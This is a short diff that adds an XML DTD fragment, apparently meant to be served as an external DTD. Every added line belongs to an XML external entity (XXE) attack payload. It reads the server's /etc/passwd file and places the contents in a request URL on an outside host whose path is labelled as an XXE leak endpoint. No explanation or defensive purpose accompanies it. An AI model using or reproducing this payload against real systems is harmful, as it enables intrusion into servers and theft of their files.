@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://github.com/hacktirss/xxe-attack/leak?data=%data;'>">
+%exfil;
+%send;
